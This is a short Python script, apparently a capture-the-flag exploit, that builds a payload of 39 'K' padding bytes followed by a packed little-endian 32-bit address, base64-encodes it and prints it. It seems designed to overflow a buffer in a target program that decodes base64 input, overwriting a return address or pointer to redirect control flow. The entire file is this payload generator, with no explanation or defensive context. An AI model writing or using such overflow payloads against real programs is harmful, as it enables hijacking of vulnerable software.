
import sys
import struct
import base64

buf = b'KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK'
buf += struct.pack('<I', 4160164553)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
